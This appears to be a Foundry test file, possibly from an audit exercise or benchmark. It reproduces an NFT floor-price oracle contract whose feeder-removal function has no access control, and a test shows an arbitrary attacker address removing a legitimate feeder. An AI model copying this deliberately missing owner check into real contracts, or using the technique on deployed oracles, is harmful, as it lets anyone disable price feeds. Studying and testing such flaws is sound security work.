// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract NFTFloorOracle {
    // only the state + functions your exploit touches
    mapping(address => bool) public feeders;

    // modifier that only checks feeder existence — NO owner check!
    modifier onlyWhenFeederExisted(address _feeder) {
        require(feeders[_feeder], "feeder-not-exist");
        _;
    }

    // vulnerable function: no access control, anyone can call
    function removeFeeder(address _feeder) external onlyWhenFeederExisted(_feeder) {
        _removeFeeder(_feeder);
    }

    // helper to simulate contract state setup
    function addFeeder(address _feeder) external {
        feeders[_feeder] = true;
    }

    function _removeFeeder(address _feeder) internal {
        feeders[_feeder] = false;
    }
}

contract NFTFloorOracleTest is Test {
    NFTFloorOracle target;
    address attacker;
    address feeder;

    function setUp() public {
        target = new NFTFloorOracle();
        attacker = makeAddr("attacker");
        feeder = makeAddr("feeder");

        // initialize an existing feeder
        target.addFeeder(feeder);
        assertEq(target.feeders(feeder), true);
    }

    function test_attacker_exploits_removeFeeder() public {
        // attacker (not owner) calls removeFeeder and succeeds because there's no access control
        vm.prank(attacker);
        target.removeFeeder(feeder);

        // feeder should be removed
        assertEq(target.feeders(feeder), false);
    }
}

